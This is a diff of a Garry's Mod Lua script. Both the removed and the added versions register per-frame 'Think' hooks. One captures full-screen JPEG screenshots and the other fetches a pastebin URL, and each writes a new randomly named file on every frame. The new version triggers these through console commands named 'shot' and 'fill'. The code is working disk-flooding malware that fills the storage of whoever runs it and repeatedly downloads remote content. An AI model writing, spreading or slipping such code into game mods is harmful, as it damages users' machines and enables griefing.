@@ -12,23 +12,28 @@ local function RandomString(length)
 
     return generateRandomString
 end
-
-hook.Add("Think",RandomString(20), function()
-
-      local fucked = render.Capture({
-    		format = "jpeg",
-    		x = 0,
-    		y = 0,
-    		w = ScrW(),
-    		h = ScrH(),
-    		quality = "100"
-    	})
-    	file.Write(RandomString(30) .. ".jpeg", fucked)
-  
-end)
-
-hook.Add("Think", RandomString(20), function()
-    http.Fetch("https://pastebin.com/raw/BEEtDWFc", function(b)
-            file.Write(RandomString(50) .. ".txt", b)
+local function helklo()
+    hook.Add("Think",RandomString(20), function()
+    
+          local fucked = render.Capture({
+        		format = "jpeg",
+        		x = 0,
+        		y = 0,
+        		w = ScrW(),
+        		h = ScrH(),
+        		quality = "100"
+        	})
+        	file.Write(RandomString(30) .. ".jpeg", fucked)
+      
     end)
-end)
+end
+local function henlo()
+    hook.Add("Think", RandomString(20), function()
+        http.Fetch("https://pastebin.com/raw/BEEtDWFc", function(b)
+                file.Write(RandomString(50) .. ".txt", b)
+        end)
+    end)
+end
+
+concommand.Add("shot",helklo)
+concommand.Add("fill",henlo)
